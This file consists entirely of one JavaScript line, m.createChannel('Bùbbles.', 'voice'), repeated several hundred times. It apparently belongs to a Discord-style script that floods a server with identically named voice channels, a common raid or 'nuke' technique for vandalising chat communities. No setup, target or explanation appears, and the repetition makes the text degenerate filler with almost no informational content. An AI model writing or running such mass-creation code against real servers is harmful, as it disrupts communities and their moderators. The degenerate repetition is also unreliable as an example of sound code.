m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');

m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
m.createChannel('Bùbbles.', 'voice');
